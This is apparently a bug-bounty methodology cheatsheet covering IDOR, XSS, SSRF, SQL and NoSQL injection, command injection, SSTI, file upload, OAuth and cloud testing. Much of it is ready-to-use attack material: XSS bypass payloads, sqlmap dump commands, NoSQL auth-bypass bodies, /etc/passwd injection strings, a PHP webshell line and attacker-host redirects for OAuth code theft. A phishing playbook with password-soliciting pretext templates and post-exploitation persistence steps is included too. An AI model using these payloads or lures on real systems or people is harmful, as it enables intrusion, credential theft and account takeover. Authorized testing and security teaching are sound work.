# Methodology Cheatsheet

Distilled from `KathanP19/HowToHunt`, `HolyBugx/HolyTips`,
`daffainfo/AllAboutBugBounty`, and `KingOfBugbounty/KingOfBugBountyTips`. The
upstream repos go deeper — see `REFERENCES.md` for links. Use this as a lookup
table during the hunt.

## Per-vuln quick checks (try first, in order)

### IDOR
1. Replace numeric IDs (1 → 2, 100 → 101) with another user's ID.
2. Replace UUID with another user's UUID (especially in PUT/DELETE).
3. Try parameter pollution: `?user_id=1&user_id=2`.
4. Swap auth tokens between two test accounts; replay the same request.
5. Look for IDs in JSON bodies, GraphQL variables, WebSocket frames — not just URL.
6. Check mass-assignment angle: PATCH `/api/users/1 {"role":"admin"}`.

### XSS
1. Reflected: inject `'"<script>alert(1)</script>` in every reflected param; check encoding.
2. DOM: search the source for `innerHTML`, `eval`, `document.write`, `location.hash`, `postMessage`.
3. Stored: profile bio, comment, file metadata (EXIF), display name, support ticket.
4. Mutation XSS: nested `<svg><a><animate attributeName=href values=javascript:alert(1)>`.
5. Bypasses: try `</script><script>`, SVG, mathml, fenced fragments.

### SSRF
1. Try `http://127.0.0.1`, `http://localhost`, `http://[::]`, `http://0.0.0.0`.
2. Cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
3. Bypass via redirect: `http://attacker.com/redirect?to=http://localhost`.
4. DNS rebinding via your own A record: TTL=0, alternate between attacker IP and localhost.
5. Bypass parser tricks: `http://127.0.0.1#@target.com`, decimal `http://2130706433`.
6. Use OOB tool (`interactsh-client`) — file uploads, webhook URLs, PDF generators.

### Open redirect
1. Find every `?redirect=`, `?next=`, `?return=`, `?continue=`, `?dest=`.
2. Bypass: `//evil.com`, `https:evil.com`, `https://evil.com\@target.com`.
3. Path-relative trick: `?redirect=/\\evil.com`.
4. Whitelist defeat: `?redirect=https://target.com.evil.com`.
5. Chain to OAuth code theft: `?redirect_uri=https://attacker.com`.

### SQLi
1. Append `'` and look for SQL error in response.
2. Time-based: `' AND SLEEP(5)--`, `' OR pg_sleep(5)--`.
3. Boolean: `' AND 1=1--` vs `' AND 1=2--` and diff response.
4. Stacked: `;DROP TABLE` (rarely works but disclosed often as severe even when not).
5. Use `ghauri` or `sqlmap` with `--level=5 --risk=3` for confirmed time-based.

### CSRF
1. Find any state-changing request (POST/PUT/DELETE) without an Authorization header.
2. Confirm no anti-CSRF token, no SameSite cookie attribute (None or absent).
3. Build minimal HTML PoC: `<form action=... method=post><input ...></form><script>document.forms[0].submit()</script>`.
4. JSON CSRF: try `Content-Type: text/plain` with a JSON-encoded body in the form.

### OAuth
1. `redirect_uri` validation lax → swap to attacker domain → leak code on referer.
2. `state` missing or fixed → CSRF on the OAuth callback.
3. Implicit flow: token in fragment → leaks via `Referer` to any embedded image.
4. PKCE not enforced → MITM/XSS can reuse the code.
5. Pre-account-takeover: register the victim's email at the IDP before they do.

### Race conditions
1. Money: send the same withdrawal request 50× in parallel — does balance go negative?
2. Coupons: redeem same single-use coupon 100× in parallel.
3. Account creation: same username 50× in parallel — duplicates?
4. Use `ffuf -p` or a goroutine-based fuzzer; avoid `&` background loops in bash for true parallelism.

### File upload
1. Bypass extension allowlist: `shell.php.jpg`, `shell.php%00.jpg`, `shell.PHP`, `shell.phtml`.
2. Bypass MIME check: keep allowed content-type in header, change body to PHP.
3. SVG with embedded JS for stored XSS.
4. Polyglot files: PNG header + PHP body → `image/png` MIME but executes as PHP.
5. ZIP/tar slip: filename `../../../etc/passwd` extracted into restricted dir.

### Subdomain takeover
1. Run `tools/takeover_scanner.sh --recon recon/<target>` — covers most fingerprints.
2. Manual: `dig CNAME suspect.target.com`; if it points at a service that returns a "no such app/page" page → claimable.
3. Check `EdOverflow/can-i-take-over-xyz` for the per-provider claim flow.

### MFA bypass
1. Response manipulation: change `success: false` → `true` in the OTP response.
2. Skip the OTP step: try the post-MFA URL directly with the pre-MFA cookie.
3. No rate limit: brute-force 6-digit OTP with 1M requests over a long window.
4. Replay the OTP after expiration window — many backends don't invalidate.
5. Force the backup-code flow when the program advertises only TOTP.

## High-EV recon one-liners

```bash
# Find every JS file the target loads, extract endpoints, then check 200/403
gau target.com | grep '\.js$' | xargs -I{} curl -s {} | linkfinder -d -o cli | tee endpoints.txt

# Fast subdomain enum + live + screenshot in one shot
subfinder -d target.com -all -silent | httpx -silent | aquatone -out aquatone/

# Pull every leaked secret from a GitHub org via dorks
GitDorker -tf tokens.txt -q '<org-name>' -d dorks/alldorks.txt -o dork.json

# Find hidden parameters on a 200 endpoint
arjun -u 'https://target.com/api/v2/users/123' -m GET --headers 'Authorization: Bearer ...'

# Race-condition burst with curl + xargs
seq 1 100 | xargs -P50 -I{} curl -sk -X POST 'https://target.com/api/redeem' -d 'coupon=ABC123'
```

## Always check, even when target looks dead

- `/.git/config`, `/.env`, `/server-status`, `/actuator`, `/.DS_Store`, `/swagger.json`, `/api-docs`.
- `/api/v1` vs `/api/v2` vs `/api/internal` — internal versions often skip auth.
- robots.txt + sitemap.xml — disclosed paths the dev didn't want spidered.
- HTTP/2 vs HTTP/1 host header smuggling on every CDN-fronted host.
- WebSocket endpoints — origin check often missing, and rarely tested.

---

## IDOR METHODOLOGY (Deep Dive)

### Reconnaissance Phase

```bash
# 1. Map all endpoints with ID parameters
grep -rE "/(users|orders|invoices|transactions|files|messages|profiles)/[0-9]+" urls.txt

# 2. Find GraphQL node queries
grep -r "node(id:" *.js *.ts

# 3. Find WebSocket message handlers
grep -r "getHistory\|getProfile\|getMessage" *.js
```

### Testing Phase

```
Step 1: Create two accounts (attacker + victim)
Step 2: As attacker, perform ALL actions on the app
Step 3: Log all requests with IDs
Step 4: As attacker, replay requests with victim's IDs
Step 5: Test EVERY endpoint with swapped IDs
Step 6: Check batch endpoints (can request multiple IDs?)
Step 7: Check GraphQL node() queries
Step 8: Check WebSocket messages
Step 9: Document each successful IDOR
```

### IDOR Variant Matrix

| Variant | Where to Look | Test Method |
|---------|--------------|-------------|
| V1: Direct path | /api/users/123 | Change 123 → 124 |
| V2: Body param | {"user_id": 123} | Change to victim's ID |
| V3: GraphQL node | {node(id: "VXNlcjox")} | Change base64 ID |
| V4: Batch | /api/users?ids=1,2,3 | Add other user IDs |
| V5: Nested | /orgs/1/users/2 | Change both IDs |
| V6: File path | ?file=../other-user/doc | Path traversal |
| V7: Predictable | Sequential IDs | Enumerate range |
| V8: Method swap | GET 403? Try PUT/DELETE | HTTP verb confusion |
| V9: Version rollback | v2 blocked? Try v1 | Old API version |
| V10: Header injection | X-User-ID: victim_id | Custom headers |

### IDOR Escalation Paths

```
IDOR (read PII) → PII export → report
IDOR (write) → modify admin → admin takeover → report
IDOR (email) → change email → password reset → ATO → report
IDOR (payment) → change payout address → financial theft → report
IDOR (file) → download other users' files → data leak → report
```

---

## XSS METHODOLOGY (Deep Dive)

### Reconnaissance Phase

```bash
# 1. Find all user-controllable inputs
grep -rE "(location\.|document\.|innerHTML|outerHTML|eval|setTimeout)" *.js

# 2. Find all reflected parameters
cat urls.txt | gf xss | sort -u

# 3. Find all endpoints that render user content
grep -rE "(bio|comment|message|display_name|name|title)" api-endpoints.txt
```

### Testing Phase

```
Step 1: Test every reflected parameter with basic payloads
Step 2: Check for encoding (URL, HTML, JavaScript)
Step 3: Test DOM XSS sinks (innerHTML, eval, document.write)
Step 4: Test stored XSS in profile fields
Step 5: Test file metadata (EXIF, filename, description)
Step 6: Check for CSP bypass techniques
Step 7: Test for mXSS (mutation-based XSS)
Step 8: Verify impact (cookie theft, session hijacking)
```

### XSS Detection Matrix

| Context | Input Point | Payload |
|---------|------------|---------|
| HTML body | Any unescaped output | `<script>alert(1)</script>` |
| HTML attribute | `<div attr="INPUT">` | `" onload=alert(1) x="` |
| JavaScript string | `<script>var x='INPUT'</script>` | `';alert(1);var x='` |
| URL context | `<a href="INPUT">` | `javascript:alert(1)` |
| CSS context | `<style>body{color:INPUT}</style>` | `}</style><script>alert(1)</script>` |

### XSS Filter Bypass Techniques

```javascript
// Tag bypasses
<script>alert(1)</script>
<scr<script>ipt>alert(1)</script>
<scr</script>ipt>alert(1)</script>
<svg onload=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

// Encoding bypasses
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&quot;alert(1)&quot;>

// Event handler variations
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
```

---

## SSRF METHODOLOGY (Deep Dive)

### Reconnaissance Phase

```bash
# 1. Find all URL parameters
cat urls.txt | gf ssrf | sort -u
grep -rE "(url|uri|link|redirect|callback|fetch|webhook|import|src=)" urls.txt

# 2. Find file upload endpoints (often fetch URLs)
grep -rE "(upload|import|avatar|thumbnail|preview)" api-endpoints.txt

# 3. Find webhook registration endpoints
grep -rE "(webhook|callback|notify)" api-endpoints.txt

# 4. Find PDF/report generators
grep -rE "(pdf|report|export|generate)" api-endpoints.txt
```

### Testing Phase

```
Step 1: Identify all URL-accepting parameters
Step 2: Test for basic SSRF: http://127.0.0.1, http://localhost
Step 3: Test for cloud metadata: http://169.254.169.254
Step 4: Test for internal services: http://localhost:6379, :9200, :2375
Step 5: Test IP bypasses (see SKILL.md for full list)
Step 6: Test protocol smuggling: gopher://, file://, dict://
Step 7: Test redirect-based bypasses
Step 8: Confirm internal access (not just DNS callback)
```

### SSRF Impact Chain

```
DNS callback only → Informational (don't submit)
Internal service accessible → Medium
Cloud metadata readable → High (key exposure)
Cloud metadata + exfil keys → Critical (code execution on cloud)
Docker API accessible → Critical (direct RCE)
Redis with sessions → Critical (ATO via session theft)
Elasticsearch with data → High (data exfiltration)
Jenkins with script → Critical (RCE via Groovy)
```

---

## SQL INJECTION METHODOLOGY

### Detection Phase

```bash
# 1. Find all parameters
cat urls.txt | gf sqli | sort -u

# 2. Test with '
curl "https://target.com/api/users?id=1'"

# 3. Check for SQL errors in response
# MySQL: "You have an error in your SQL syntax"
# PostgreSQL: "PG::SyntaxError"
# MSSQL: "Incorrect syntax near"
# Oracle: "ORA-01756"
```

### Exploitation Phase

```bash
# 1. Determine database type from error messages
# 2. Determine column count with UNION SELECT NULL--
# 3. Find data types: UNION SELECT 'a',NULL,NULL--
# 4. Extract data: UNION SELECT username,NULL,NULL FROM users--
# 5. Enumerate tables: UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
# 6. Dump credentials
```

### SQLi Tool Usage

```bash
# SQLMap (automated)
sqlmap -u "https://target.com/api/users?id=1" --batch --level=5 --risk=3
sqlmap -u "https://target.com/api/users?id=1" --batch --dbs
sqlmap -u "https://target.com/api/users?id=1" --batch -D dbname --tables
sqlmap -u "https://target.com/api/users?id=1" --batch -D dbname -T users --columns
sqlmap -u "https://target.com/api/users?id=1" --batch -D dbname -T users --dump

# ghauri (modern alternative)
ghauri -u "https://target.com/api/users?id=1"
```

---

## NOSQL INJECTION METHODOLOGY

### Detection Phase

```bash
# 1. Find API endpoints that accept JSON
grep -rE "application/json" api-endpoints.txt

# 2. Test login endpoints with NoSQL payloads
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# 3. Check response
# 200/302 with valid session = NoSQLi confirmed
```

### Exploitation Phase

```json
// Auth bypass
{"username": {"$ne": null}, "password": {"$ne": null}}

// User enumeration
{"username": {"$regex": "^a"}, "password": {"$ne": null}}

// Data extraction via regex
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
// Try different patterns: ^ad, ^adm, ^admi, etc.

// Blind extraction via timing
{"username": {"$eq": "admin"}, "$where": "sleep(5000)"}
```

---

## COMMAND INJECTION METHODOLOGY

### Detection Phase

```bash
# 1. Find parameters that might be passed to system commands
grep -rE "(exec|system|popen|shell_exec|passthru|proc_open)" *.php *.py *.js

# 2. Test with basic payloads
; id
| id
`id`
$(id)

# 3. Blind confirmation
; sleep 5
| ping -c 5 127.0.0.1
```

### Filter Bypass Phase

```
If basic payloads blocked:
1. Try space bypasses: ;{cat,/etc/passwd}
2. Try variable substitution: ;cat${IFS}/etc/passwd
3. Try quote bypasses: ;c'a't /etc/passwd
4. Try encoding: base64, hex
5. Try different shells: $BASH -c 'id'
```

---

## SSTI METHODOLOGY

### Detection Phase

```
Step 1: Identify all template contexts
- Username/bio fields
- Email templates
- PDF generators
- Error messages
- URL parameters reflected in page

Step 2: Send detection payloads
{{7*7}}        → 49?
${7*7}         → 49?
<%= 7*7 %>     → 49?
#{7*7}         → 49?
*{7*7}         → 49?

Step 3: Identify template engine from response
```

### Exploitation Phase

```
Step 1: Confirm RCE with engine-specific payload
Step 2: Enumerate system: whoami, id, pwd
Step 3: Read sensitive files: /etc/passwd, config files
Step 4: Escalate if possible: reverse shell, webshell
```

---

## FILE UPLOAD METHODOLOGY

### Detection Phase

```
Step 1: Find file upload endpoints
Step 2: Upload allowed file type (e.g., image.jpg) → confirm it works
Step 3: Try uploading PHP/shell file → is it blocked?
Step 4: Check how file is validated (extension, MIME, content)
Step 5: Check where file is stored and how it's accessed
```

### Bypass Phase

```
If extension blocked:
1. Double extension: shell.php.jpg
2. Case variation: shell.pHp, shell.PHP5
3. Null byte: shell.php%00.jpg
4. Alternative extensions: .phtml, .phar, .shtml
5. Content-Type spoof: image/jpeg header with PHP content

If MIME check:
1. Keep allowed Content-Type header
2. Change body to PHP content
3. Magic bytes: GIF89a; <?php system($_GET['c']); ?>

If content inspection:
1. Polyglot files: valid image + PHP code
2. SVG with embedded JS (for XSS)
3. ZIP slip: ../../etc/cron.d/shell in filename
```

---

## RACE CONDITION METHODOLOGY

### Detection Phase

```
Step 1: Identify critical operations
- Financial (withdrawal, transfer, coupon redemption)
- Auth (OTP verification, password reset)
- Resource (limited inventory, bonus claiming)
- State (status changes, approvals)

Step 2: Understand the race window
- How long does the operation take?
- When is the lock released?
- Can multiple requests fit in the window?

Step 3: Craft the race
- Use Burp Turbo Intruder (single-packet attack)
- Or: Python threading with requests
- Or: ffuf with high concurrency
```

### Exploitation Phase

```
Step 1: Test with 5 parallel requests
Step 2: Test with 20 parallel requests
Step 3: Test with 50 parallel requests
Step 4: Document success rate
Step 5: Quantify impact (how much gained per successful race?)
Step 6: Record video evidence
```

---

## BUSINESS LOGIC METHODOLOGY

### Testing Framework

```
For each business feature:

1. Understand the happy path
   - What's the normal user flow?
   - What are the expected states?

2. Map state transitions
   - What states exist? (pending, processing, completed, cancelled)
   - What transitions are valid?
   - Can states be skipped?

3. Identify validation points
   - Balance checks
   - Permission checks
   - Rate limits
   - Ownership checks

4. Test edge cases
   - Negative values
   - Zero values
   - Maximum values
   - Concurrent operations

5. Test workflow skipping
   - Can I access final step directly?
   - Can I reorder steps?
   - Can I repeat steps?
```

### Common Business Logic Bugs

| Bug Type | Test | Impact |
|----------|------|--------|
| Price manipulation | Negative quantity, price override | Financial theft |
| Coupon stacking | Multiple coupons in one order | Excess discount |
| Workflow skip | POST to final step directly | Bypass checks |
| Race condition | Parallel requests on financial ops | Double spend |
| State confusion | Manipulate order status | Free items |
| Quantity overflow | Max quantity, negative quantity | Inventory bypass |
| Currency manipulation | Different currency codes | Price bypass |

---

## SUBDOMAIN TAKEOVER METHODOLOGY

### Detection Phase

```bash
# 1. Enumerate subdomains
subfinder -d target.com -silent | dnsx -silent -cname -resp | \
  grep -E "CNAME.*(github\.io|heroku|azure|netlify|s3\.amazonaws|cloudfront)"

# 2. Run nuclei takeover templates
nuclei -l subdomains.txt -t takeovers/ -o takeovers.txt

# 3. Manual check
for sub in $(cat suspicious.txt); do
    echo "=== $sub ==="
    curl -s "$sub" | head -20
done
```

### Fingerprint Matching

| Service | Fingerprint |
|---------|------------|
| GitHub Pages | "There isn't a GitHub Pages site here" |
| AWS S3 | "NoSuchBucket" |
| Heroku | "No such app" |
| Azure | "404 Web Site not found" |
| Fastly | "Fastly error: unknown domain" |
| GitLab Pages | "project not found" |
| Shopify | "It looks like you may have typed..." |
| Netlify | "Not found - Request ID:" |
| Vercel | "The specified resource does not exist" |

---

## AUTHENTICATION BYPASS METHODOLOGY

### Testing Framework

```
Step 1: Map all authentication entry points
- Login forms
- OAuth flows
- API key validation
- Session management
- Password reset
- MFA endpoints

Step 2: Test each entry point for bypass
- Missing auth on protected endpoints
- Method-based bypass (GET auth, POST no auth)
- Path-based bypass (case, encoding)
- Header-based bypass (internal headers)
- Parameter-based bypass (?admin=true)

Step 3: Test post-authentication flows
- Session fixation
- Token reuse
- Concurrent session limits
- Privilege escalation
```

### Common Auth Bypass Patterns

| Pattern | Test Method |
|---------|------------|
| Missing middleware | Try endpoints without auth |
| Method confusion | GET auth → POST no auth |
| Path confusion | /admin vs /Admin vs /admin/../admin |
| Header bypass | X-Forwarded-For: 127.0.0.1 |
| Parameter bypass | ?debug=true, ?admin=true |
| JWT none | Change alg to "none" |
| JWT alg confusion | Change RS256 → HS256 |
| Session fixation | Set session before login |
| Token reuse | Use old token after logout |
| OAuth state bypass | Remove state parameter |

---

## CSRF METHODOLOGY

### Detection Phase

```
Step 1: Find all state-changing endpoints
- POST, PUT, DELETE, PATCH
- Any endpoint that modifies data

Step 2: Check for CSRF protection
- CSRF token header?
- SameSite cookie attribute?
- Content-Type validation?

Step 3: Build PoC
- Create HTML form
- Auto-submit on load
- Test from attacker.com
```

### CSRF Bypass Techniques

| Technique | Method |
|-----------|--------|
| Remove token | Submit without X-CSRF-Token header |
| Token reuse | Use old token from previous session |
| Content-Type bypass | Change to text/plain or multipart |
| SameSite bypass | Target is subdomain of same site |
| Cookie manipulation | Remove Secure flag, use HTTP |

---

## OAUTH/OIDC METHODOLOGY

### Testing Framework

```
Step 1: Map the OAuth flow
- Authorization endpoint
- Token endpoint
- Redirect URI
- Scopes requested

Step 2: Test each flow component
- redirect_uri validation (exact match?)
- state parameter (present, random, validated?)
- PKCE enforcement (for public clients)
- Token type (access, refresh, ID)
- Scope enforcement

Step 3: Test for common vulns
- Open redirect in redirect_uri
- State parameter bypass
- Token leakage (implicit flow)
- PKCE bypass
- Authorization code reuse
```

---

## CLOUD SECURITY METHODOLOGY

### AWS Enumeration

```bash
# 1. Check for exposed S3 buckets
for suffix in "" -dev -staging -test -backup -api -data -assets -static -cdn -uploads; do
    for prefix in target target-assets target-data target-backup; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "https://${prefix}${suffix}.s3.amazonaws.com/")
        [ "$code" != "404" ] && echo "$code ${prefix}${suffix}.s3.amazonaws.com"
    done
done

# 2. Check for exposed EBS snapshots
aws ec2 describe-snapshots --owner-ids self

# 3. Check for exposed RDS instances
aws rds describe-db-instances

# 4. Check for Lambda functions
aws lambda list-functions
```

### GCP Enumeration

```bash
# 1. Check for exposed GCS buckets
gsutil ls gs://target*

# 2. Check for exposed GCE instances
gcloud compute instances list

# 3. Check for exposed App Engine apps
gcloud app services list
```

### Azure Enumeration

```bash
# 1. Check for exposed blob storage
curl https://account.blob.core.windows.net/container?restype=container&comp=list

# 2. Check for exposed VMs
az vm list

# 3. Check for exposed functions
az functionapp list
```

---

## MOBILE APP METHODOLOGY

### Android Testing

```bash
# 1. Recon
adb devices
adb shell pm list packages | grep target
adb shell "pm dump com.target.app" | grep -i "permission"

# 2. Extract APK
adb pull /data/app/com.target.app-1/base.apk ./target.apk

# 3. Decompile
jadx target.apk -d ./decompiled/
# Or: apktool d target.apk

# 4. Analyze
grep -rE "(api|url|endpoint|key|secret|token)" ./decompiled/
grep -rE "(http://|https://)" ./decompiled/

# 5. Dynamic analysis
# - Burp proxy
# - Frida for SSL pinning bypass
# - Objection for runtime analysis
```

### iOS Testing

```bash
# 1. Get IPA (from device or App Store)
# 2. Decrypt if needed (frida, clutch)
# 3. Decompile (class-dump, Hopper, Ghidra)
# 4. Analyze strings and classes
strings Payload.app/Target | grep -i "api\|url\|key"

# 5. Dynamic analysis
iproxy 8080 8080
# Configure Burp proxy on device
```

---

## SOCIAL ENGINEERING METHODOLOGY

### Phishing Playbook

```
Step 1: Recon target
- Company structure (who to target?)
- Email format (first.last@company.com?)
- Tools used (Slack, Teams, Google Workspace?)
- Security awareness level

Step 2: Create lures
- Fake login page (clone target's login)
- Fake file sharing (Google Drive, Dropbox)
- Fake IT notification ("password expired")
- Fake collaboration request ("please review this doc")

Step 3: Execute
- Send phishing email
- Monitor for clicks/credentials
- Use captured credentials for access

Step 4: Post-exploitation
- Enumerate internal resources
- Pivot to other systems
- Establish persistence
```

### pretexting Templates

```
Template 1: IT Support
"Hi, I'm from IT. We're doing a security update and need you to 
confirm your password. Please reply with your current password."

Template 2: Urgent Request
"Hey, boss needs this document reviewed ASAP. Can you check this link?
[malicious link pretending to be Google Doc]"

Template 3: Password Reset
"Your password has expired. Click here to reset:
[link to fake login page]"
```

---

## FINAL METHODOLOGY RULES

1. **Always start with reconnaissance** — understand the target before hacking
2. **Use the 5-minute rule** — if nothing in 5 minutes, move on
3. **Use the 1-hour rule** — if stuck for 1 hour, switch targets
4. **Document everything** — screenshots, requests, responses
5. **Think in chains** — single bugs pay less than chains
6. **Validate before reporting** — test on production, use two accounts
7. **Kill weak findings fast** — don't waste time on theoretical bugs
8. **Focus on impact** — severity comes from harm, not vuln class
9. **Learn from disclosed reports** — study what paid before
10. **Practice on labs** — PortSwigger, HackTheBox, TryHackMe
